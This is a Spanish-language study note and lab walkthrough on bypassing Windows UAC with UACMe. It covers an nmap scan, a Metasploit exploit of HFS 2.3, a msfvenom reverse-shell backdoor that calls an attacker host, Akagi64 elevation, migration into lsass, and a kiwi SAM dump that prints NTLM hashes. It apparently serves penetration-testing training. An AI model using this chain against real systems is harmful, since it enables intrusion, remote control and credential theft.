21-03-2025 20:43
Status: #idea
Tags: [[Windows Privilege Escalation]]

- [[#Uso de UACMe|Uso de UACMe]]

# Bypassing UAC (UACMe)

UAC es una herramienta de Windows que permite solicitar permisos del administrador para realizar ciertas acciones.

Básicamente, permite indicarle a Windows que el usuario está seguro de que quiere ejecutar el programa.

Para conseguir saltarnos UAC, necesitaremos acceso a una cuenta de usuario que esté en el grupo de local administrators.

Como en la elevación de permisos, las técnicas van a cambiar dependiendo de la versión que usemos de Windows.

Para verificar que usuarios hay en la máquina, y cuales forman parte del grupo de administradores podremos usar estos comandos en un shell:

```shell
net user
net localgroup administrators
```

Si estamos en un meterpreter, habrá que spawnear una shell antes, con el comando **shell**.

Para verificar que UAC está funcionando correctamente, podremos intentar cambiar la contraseña de algún admin, por ejemplo:

```shell
net user admin password123
```

## Uso de UACMe

[UACMe](https://github.com/hfiref0x/UACME) es una herramienta que nos ayudará a saltarnos esta comprobación de Windows.

Tendremos que generar un payload con msfvenom:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe > backdoor.exe
```

Posteriormente, tendremos que crear un listener, para lo que usaremos **multi/handler**, poniendo la payload **windows/meterpreter/reverse_tcp**, poniendo el LHOST y LPORT como siempre.

Si no existe el directorio Temp, tendremos que navegar a C: y crearlo, y posteriormente, subir en la máquina que tenemos el meterpreter nuestro backdoor.exe con el comando upload, además del Akagi64 o Akagi32 de UACMe.

```shell
upload backdoor.exe
upload Akagi64.exe
```

Para este lab, usaremos la key 23, pero esto, si miras la documentación, verás que puede variar dependiendo de lo que queramos hacer, y de la versión de Windows.

```shell
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

Esto conseguirá que se ejecute nuestro backdoor.exe con privilegios elevados, consiguiendo así una sesión de meterpreter con permisos elevados.

Si hacemos ahora **getprivs**, veremos como tenemos más privilegios que antes.

Esto nos permitirá migrar a cualquier otro proceso, por ejemplo, **lsass.exe** que tenga permisos de NT AUTHORITY\SYSTEM con el comando migrate especificando el PID (Process ID):

```shell
ps
migrate 688
```

Si ahora volvemos a hacer **getuid**, veremos como somos NT AUTHORITY\SYSTEM.


## Práctica

Se nos presenta una máquina que está usando varios servicios por los que podemos intentar entrar, entre ellos SMB, RDP, y un File Server que llama a la atención en el puerto 80.

```terminal
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=victim
| Not valid before: 2025-03-25T18:45:44
|_Not valid after:  2025-09-24T18:45:44
| rdp-ntlm-info: 
|   Target_Name: VICTIM
|   NetBIOS_Domain_Name: VICTIM
|   NetBIOS_Computer_Name: VICTIM
|   DNS_Domain_Name: victim
|   DNS_Computer_Name: victim
|   Product_Version: 6.3.9600
|_  System_Time: 2025-03-26T18:51:01+00:00
|_ssl-date: 2025-03-26T18:51:08+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-03-26T18:51:02
|_  start_date: 2025-03-26T18:44:21
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required

```

Esto me llevó a investigar el file server, y observar la versión que tiene. Si indagamos un poco más, veremos como este file server tiene un [CVE en 2014](https://www.exploit-db.com/exploits/39161), como vemos en exploit-db.com tiene un POC, pero también busqué en metasploit para ver si existía un módulo por comodidad, y si, existía.

Usando este exploit, conseguí spawnear una sesión de meterpreter, y posteriormente me centraré en elevar los privilegios haciendo un bypass uac, ya que si usamos los comandos para ver si nuestro usuario está en grupos de administradores obtendremos lo siguiente:

```powershell
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net user admin password123
net user admin password123
System error 5 has occurred.

Access is denied.
```

Como vemos, al intentar cambiar la contraseña con el comando **net user `<usuario> <contraseña>`**, nos da que el acceso es denegado.

Acto siguiente, he generado una payload con msfvenom con el siguiente comando:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=1234 -f exe > backdoor.exe
```

Esto generará el archivo backdoor.exe que posteriormente tendremos que subir al servidor vulnerado.

También tenemos en la ruta **/root/Desktop/Tools/UACME** el fichero Akagi64.exe necesario para completar la práctica.

Una vez subidos con el comando upload ambos archivos, podremos pasar a ejecutarlos y conseguir nuestra backdoor:

```terminal
.\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\1\backdoor.exe
```

> [!DANGER] Listener
> Recuerda generar un listener con el payload **windows/meterpreter/reverse_tcp**, si no es probable que no funcione.

Ahora que tenemos nuestro nuevo meterpreter, nos metemos en el con **sessions X**, y usaremos el comando **getprivs** para ver nuestros permisos.

Posteriormente, usaremos el comando **ps**, para listar los procesos y buscaremos un proceso que esté usando NT AUTHORITY\SYSTEM, y migramos a el con el comando **migrate `PID`**.

Si ahora hacemos **getuid**, veremos que nos debería de dar NT AUTHORITY\SYSTEM.

Si ahora queremos dumpear las hashes, tendremos que hacer lo siguiente:

```shell
load kiwi
lsa_dump_sam
```

Y con esto nos debería de dar las hashes de la cuenta de administrador de la máquina vulnerada:

```shell
Domain : VICTIM
SysKey : 23675d238b2d51b9bd6c6885a4fbe6cf
Local SID : S-1-5-21-2563855374-3215282501-1490390052

SAMKey : 3a6573bd037a5d6890f5cf1dd77c8f40

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 659c8124523a634e0ba68e64bb1d822f

RID  : 000001f5 (501)
User : Guest

RID  : 000003f4 (1012)
User : admin
  Hash NTLM: 4d6583ed4cef81c2f2ac3c88fc5f3da6
```

---
# Backlinks

```dataview
LIST
FROM [[]]
SORT file.name ASC
```
